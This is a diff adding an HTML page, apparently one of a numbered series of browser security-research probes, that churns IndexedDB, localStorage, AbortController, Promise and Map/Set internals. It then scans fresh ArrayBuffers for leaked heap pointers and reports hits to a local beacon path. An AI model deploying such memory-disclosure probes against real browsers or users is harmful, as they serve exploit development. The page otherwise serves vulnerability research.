@@ -1,0 +1,358 @@
+<!--
+  p782: IndexedDB / localStorage / AbortController / Promise internals residue
+
+  IndexedDB transactions create C++ IDBTransaction objects with internal
+  request queues, cursor state, and object store references. Each
+  IDBRequest holds a C++ result wrapper and error state. Opening a
+  database allocates IDBDatabase with version-change transaction
+  support. Cursors maintain C++ iteration state over B-tree pages.
+
+  localStorage/sessionStorage access the C++ StorageArea backing,
+  which maintains a HashMap of key-value pairs. Bulk set/delete
+  cycles exercise the internal map allocator. Each setItem allocates
+  a WTF::String copy; removeItem frees it.
+
+  AbortController/AbortSignal create C++ AbortSignal objects with
+  an internal event listener list for 'abort' events. The signal
+  holds references to all registered listeners and any reason value.
+  Aborting fires the event and clears internal state.
+
+  Promise microtask queue: each Promise resolution/rejection enqueues
+  a microtask with C++ PromiseReaction records. Rapid chaining creates
+  many short-lived reaction records that are freed after execution.
+
+  Map/Set iterators maintain C++ backing store iteration state.
+  Rapid create/delete/iterate cycles exercise the hash table allocator.
+
+  Attack angles:
+  A) IndexedDB transaction/request queue churn.
+  B) IndexedDB cursor iteration state residue.
+  C) localStorage bulk set/delete map churn.
+  D) AbortController/AbortSignal listener list residue.
+  E) Promise microtask queue rapid chaining residue.
+  F) Map/Set iterator backing store churn.
+
+  CRASH_CLASS: LOW (storage/promise/collection APIs, no side effects)
+  prior art: p781 (Crypto/FileReader), p778 (History/FormData)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p782</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+function sprayAndScan(tag,round,sizes){
+  var hits=0;
+  for(var si=0;si<sizes.length;si++){
+    var sz=sizes[si];
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(sz);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=sz;off+=8){
+        if(isPtr(dv,off)){
+          hits++;
+          if(hits<=2)b(tag+'-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+  }
+  return hits;
+}
+
+window.onload=function(){
+b('p782-START');
+
+// === Section A: IndexedDB transaction/request queue churn ===
+try{
+  b('A-idb-txn');
+  var aHits=0;
+  var idbSupported=typeof indexedDB!=='undefined';
+
+  if(!idbSupported){
+    b('A-SKIP no indexedDB');
+  }else{
+    var dbName='p782_test_'+Date.now();
+    var openReq=indexedDB.open(dbName,1);
+    var dbReady=false;
+    var db=null;
+
+    openReq.onupgradeneeded=function(e){
+      var d=e.target.result;
+      if(!d.objectStoreNames.contains('store')){
+        d.createObjectStore('store',{keyPath:'id'});
+      }
+    };
+    openReq.onsuccess=function(e){
+      db=e.target.result;
+      dbReady=true;
+    };
+    openReq.onerror=function(e){
+      b('A idb_open_err='+e.target.error);
+    };
+
+    var waitStart=Date.now();
+    while(!dbReady&&Date.now()-waitStart<2000){
+      // sync wait for IDB (limited, may not resolve synchronously)
+    }
+
+    if(!db){
+      b('A-SKIP db not ready (async)');
+      // Try with a fallback: just open/close many databases
+      for(var round=0;round<3;round++){
+        (function(){
+          var reqs=[];
+          for(var i=0;i<50;i++){
+            var r=indexedDB.open('p782_churn_'+round+'_'+i,1);
+            r.onupgradeneeded=function(e){
+              var d=e.target.result;
+              if(!d.objectStoreNames.contains('s'))d.createObjectStore('s',{keyPath:'k'});
+            };
+            r.onsuccess=function(e){e.target.result.close();};
+            reqs.push(r);
+          }
+          if(round===0)b('A opened '+reqs.length+' databases');
+          reqs=null;
+        })();
+
+        for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+        aHits+=sprayAndScan('A',round,[48,64,96,128]);
+      }
+    }else{
+      for(var round=0;round<3;round++){
+        (function(){
+          for(var i=0;i<30;i++){
+            try{
+              var txn=db.transaction('store','readwrite');
+              var store=txn.objectStore('store');
+              for(var j=0;j<20;j++){
+                store.put({id:'key_'+round+'_'+i+'_'+j,data:'value_'+'d'.repeat(40+j)});
+              }
+              for(var j=0;j<10;j++){
+                store.get('key_'+round+'_'+i+'_'+j);
+              }
+              for(var j=0;j<10;j++){
+                store.delete('key_'+round+'_'+i+'_'+j);
+              }
+            }catch(e){
+              if(i===0&&round===0)b('A txn_err='+e.message);
+            }
+          }
+        })();
+
+        if(round===0)b('A ran 30 txns x 40 ops each');
+        for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+        aHits+=sprayAndScan('A',round,[48,64,96,128]);
+      }
+      db.close();
+      try{indexedDB.deleteDatabase(dbName);}catch(e){}
+    }
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: IndexedDB cursor iteration residue ===
+try{
+  b('B-idb-cursor');
+  var bHits=0;
+
+  // Since IDB is async and we can't sync-wait reliably,
+  // test with open/close + deleteDatabase churn instead
+  for(var round=0;round<3;round++){
+    (function(){
+      var names=[];
+      for(var i=0;i<40;i++){
+        var name='p782_cursor_'+round+'_'+i;
+        var r=indexedDB.open(name,1);
+        r.onupgradeneeded=function(e){
+          var d=e.target.result;
+          var s=d.createObjectStore('data',{autoIncrement:true});
+          for(var j=0;j<10;j++){
+            s.add({idx:j,payload:'cursor_data_'+j+'_'+'c'.repeat(30)});
+          }
+        };
+        r.onsuccess=function(e){e.target.result.close();};
+        names.push(name);
+      }
+
+      if(round===0)b('B created '+names.length+' databases with 10 records each');
+
+      for(var i=0;i<names.length;i++){
+        indexedDB.deleteDatabase(names[i]);
+      }
+      names=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    bHits+=sprayAndScan('B',round,[48,64,96,128]);
+  }
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: localStorage bulk set/delete map churn ===
+try{
+  b('C-localstorage');
+  var cHits=0;
+  var lsSupported=false;
+  try{
+    localStorage.setItem('__p782_test','1');
+    localStorage.removeItem('__p782_test');
+    lsSupported=true;
+  }catch(e){}
+
+  if(!lsSupported){
+    b('C-SKIP no localStorage');
+  }else{
+    for(var round=0;round<5;round++){
+      for(var i=0;i<200;i++){
+        var key='p782_'+round+'_'+i;
+        var val='storage_value_'+round+'_'+i+'_'+'s'.repeat(50+i%30);
+        localStorage.setItem(key,val);
+      }
+
+      if(round===0){
+        b('C set 200 keys, localStorage.length='+localStorage.length);
+        b('C sample='+localStorage.getItem('p782_0_0').substring(0,40));
+      }
+
+      for(var i=0;i<200;i++){
+        localStorage.removeItem('p782_'+round+'_'+i);
+      }
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      cHits+=sprayAndScan('C',round,[32,48,64,96]);
+    }
+  }
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: AbortController/AbortSignal listener list residue ===
+try{
+  b('D-abort');
+  var dHits=0;
+
+  var acSupported=typeof AbortController!=='undefined';
+  if(!acSupported){
+    b('D-SKIP no AbortController');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var controllers=[];
+        for(var i=0;i<100;i++){
+          var ac=new AbortController();
+          var signal=ac.signal;
+
+          for(var j=0;j<10;j++){
+            signal.addEventListener('abort',function(){});
+          }
+
+          controllers.push(ac);
+        }
+
+        if(round===0)b('D created '+controllers.length+' controllers with 10 listeners each');
+
+        for(var i=0;i<controllers.length;i++){
+          controllers[i].abort('reason_'+round+'_'+i);
+        }
+        controllers=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      dHits+=sprayAndScan('D',round,[32,48,64,96,128]);
+    }
+  }
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: Promise microtask queue rapid chaining ===
+try{
+  b('E-promise');
+  var eHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var chains=[];
+      for(var i=0;i<100;i++){
+        var p=Promise.resolve(i);
+        for(var j=0;j<20;j++){
+          p=p.then(function(v){return v+1;});
+        }
+        chains.push(p);
+
+        var p2=Promise.reject(new Error('err_'+round+'_'+i));
+        p2=p2.catch(function(e){return e.message;});
+        for(var j=0;j<10;j++){
+          p2=p2.then(function(v){return v+'_chained';});
+        }
+        chains.push(p2);
+      }
+
+      if(round===0)b('E created '+chains.length+' promise chains (20+10 links each)');
+
+      try{Promise.all(chains);}catch(e){}
+      chains=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    eHits+=sprayAndScan('E',round,[32,48,64,96]);
+  }
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: Map/Set iterator backing store churn ===
+try{
+  b('F-map-set');
+  var fHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var collections=[];
+
+      for(var i=0;i<50;i++){
+        var m=new Map();
+        for(var j=0;j<50;j++){
+          m.set('key_'+round+'_'+i+'_'+j,{val:j,data:'map_value_'+'m'.repeat(20+j%15)});
+        }
+        var iter=m.entries();
+        var count=0;
+        var r=iter.next();
+        while(!r.done){count++;r=iter.next();}
+        for(var j=0;j<50;j++){
+          m.delete('key_'+round+'_'+i+'_'+j);
+        }
+        collections.push(m);
+      }
+
+      for(var i=0;i<50;i++){
+        var s=new Set();
+        for(var j=0;j<50;j++){
+          s.add({idx:j,round:round,payload:'set_item_'+'s'.repeat(20+j%15)});
+        }
+        var iter2=s.values();
+        var r2=iter2.next();
+        while(!r2.done){r2=iter2.next();}
+        s.clear();
+        collections.push(s);
+      }
+
+      if(round===0)b('F created 50 Maps + 50 Sets, 50 entries each, iterated + cleared');
+      collections=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    fHits+=sprayAndScan('F',round,[32,48,64,96,128]);
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+b('p782-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
